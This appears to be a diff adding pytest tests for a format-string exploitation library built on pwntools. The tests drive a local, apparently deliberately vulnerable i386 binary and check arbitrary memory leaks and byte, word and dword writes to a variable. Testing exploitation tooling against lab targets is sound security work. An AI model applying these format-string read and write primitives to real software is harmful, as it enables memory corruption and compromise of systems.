@@ -1,0 +1,112 @@
+#!/usr/bin/env python
+
+import os
+
+SCRIPTDIR = os.path.dirname(os.path.realpath(__file__))
+
+import sys
+#sys.path.insert(0, os.path.join(SCRIPTDIR,"..",".."))
+
+from formatStringExploiter.FormatString import FormatString
+from pwn import *
+import logging
+import pytest
+
+def exec_fmt(s):
+    sys.stdout.write("Execing " + repr(s))
+    sys.stdout.flush()
+    p.sendline(s)
+    out = p.recvuntil("myVar value is:",drop=True)
+    p.recvuntil("Input: ")
+    sys.stdout.write("Returning " + out)
+    sys.stdout.flush()
+    return out
+
+
+def get_myVar():
+    p.sendline("blerg")
+    p.recvuntil("myVar value is: ")
+    ret = int(p.recvline(),16)
+    p.recvuntil("Input: ")
+    return ret
+
+def startIt():
+    global p
+    global fmtStr
+    p = process(os.path.join(SCRIPTDIR,fName),buffer_fill_size=0xffff)
+    p.recvuntil("Input: ")
+    fmtStr = FormatString(exec_fmt,elf=elf)
+
+
+logging.basicConfig(level=logging.DEBUG)
+log = logging.getLogger()
+
+fName = "i386_echoServicePad"
+
+elf = ELF(os.path.join(SCRIPTDIR,fName))
+startIt()
+
+
+def test_matching():
+    assert fmtStr.leak.d(elf.symbols['myVar']) == get_myVar()
+
+def test_change_byte_as_int():
+    fmtStr.write_b(elf.symbols['myVar']+3,0xbe)
+    fmtStr.leak.cleard(elf.symbols['myVar'])
+    assert get_myVar() == 0xbeadbeef
+    assert fmtStr.leak.d(elf.symbols['myVar']) == get_myVar()
+
+def test_change_word_as_int():
+    fmtStr.write_w(elf.symbols['myVar'],0xf00d)
+    assert get_myVar() == 0xbeadf00d
+    fmtStr.leak.cleard(elf.symbols['myVar'])
+    assert fmtStr.leak.d(elf.symbols['myVar']) == get_myVar()
+
+def test_change_dword_as_int():
+    fmtStr.write_d(elf.symbols['myVar'],0xcafebab3)
+    assert get_myVar() == 0xcafebab3
+    fmtStr.leak.cleard(elf.symbols['myVar'])
+    assert fmtStr.leak.d(elf.symbols['myVar']) == get_myVar()
+
+def test_change_byte_as_str():
+    fmtStr.write_d(elf.symbols['myVar'],0xdeadbeef)
+    fmtStr.write_b(elf.symbols['myVar']+3,"\xaa")
+    assert get_myVar() == 0xaaadbeef
+    fmtStr.leak.cleard(elf.symbols['myVar'])
+    assert fmtStr.leak.d(elf.symbols['myVar']) == get_myVar()
+
+def test_change_word_as_str():
+    fmtStr.write_w(elf.symbols['myVar'],"\x0d\xf0")
+    assert get_myVar() == 0xaaadf00d
+    fmtStr.leak.cleard(elf.symbols['myVar'])
+    assert fmtStr.leak.d(elf.symbols['myVar']) == get_myVar()
+
+def test_change_dword_as_str():
+    fmtStr.write_d(elf.symbols['myVar'],"\xca\xfe\xba\xb3"[::-1])
+    assert get_myVar() == 0xcafebab3
+    fmtStr.leak.cleard(elf.symbols['myVar'])
+    assert fmtStr.leak.d(elf.symbols['myVar']) == get_myVar()
+
+def test_change_null_byte():
+    fmtStr.write_d(elf.symbols['myVar'],0xcafebab3)
+    # We already have bytes written, this should fail.
+    fmtStr.write_b(elf.symbols['myVar']+3,0)
+    assert get_myVar() == 0xcafebab3
+    fmtStr.leak.cleard(elf.symbols['myVar'])
+    assert fmtStr.leak.p(elf.symbols['myVar']) == get_myVar()
+
+def test_change_null_word():
+    fmtStr.write_d(elf.symbols['myVar'],0xdeadbeef)
+    # We already have bytes written, this should fail.
+    fmtStr.write_w(elf.symbols['myVar'],0)
+    assert get_myVar() == 0xdeadbeef
+    fmtStr.leak.cleard(elf.symbols['myVar'])
+    assert fmtStr.leak.p(elf.symbols['myVar']) == get_myVar()
+
+def test_change_null_dword():
+    fmtStr.write_d(elf.symbols['myVar'],0xdeadbeef)
+    # We already have bytes written, this should fail.
+    fmtStr.write_d(elf.symbols['myVar'],0)
+    assert get_myVar() == 0xdeadbeef
+    fmtStr.leak.cleard(elf.symbols['myVar'])
+    assert fmtStr.leak.p(elf.symbols['myVar']) == get_myVar()
